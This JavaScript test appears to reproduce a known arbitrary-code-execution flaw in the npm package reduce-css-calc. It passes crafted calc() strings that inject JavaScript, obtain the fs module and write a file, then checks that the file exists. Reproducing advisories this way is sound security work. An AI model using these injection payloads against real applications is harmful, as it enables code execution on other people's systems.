//https://security.snyk.io/vuln/npm:reduce-css-calc:20160913
test("Arbitrary code execution in reduce-css-calc", () => {
  const fs = require("fs");
  const reduceCSSCalc = require("reduce-css-calc");
  const path = "./reduce-css-calc";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
    console.log(
      reduceCSSCalc(
        `calc(                       (global['fs'] = require('fs')))`
      )
    );
    console.log(
      reduceCSSCalc(
        `calc(                       (fs['writeFileSync']("reduce-css-calc", "")))`
      )
    );
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
